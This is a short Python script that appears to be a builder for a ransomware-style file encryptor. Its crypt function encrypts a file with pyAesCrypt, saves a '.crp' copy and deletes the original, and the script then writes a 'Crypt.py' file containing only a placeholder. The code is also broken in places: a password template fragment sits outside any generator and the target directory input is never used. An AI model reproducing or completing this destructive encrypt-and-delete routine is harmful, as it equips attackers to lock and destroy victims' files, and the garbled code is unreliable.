import os
import sys
def crypt(file):
    import pyAesCrypt
    print('-' * 80)
    # Set password and buffer size
    password = "'''+str(password)+'''"
    buffer_size = 512*1024
    # Call encryption function
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)
    print("[Encrypt] '"+str(file)+".crp'")
    # Remove the original file
    os.remove(file)

direct = input("Specify the target directory: ")
password = input("Enter the password: ")


with open("Crypt.py", "w") as crypt:
    crypt.write('''program code''')
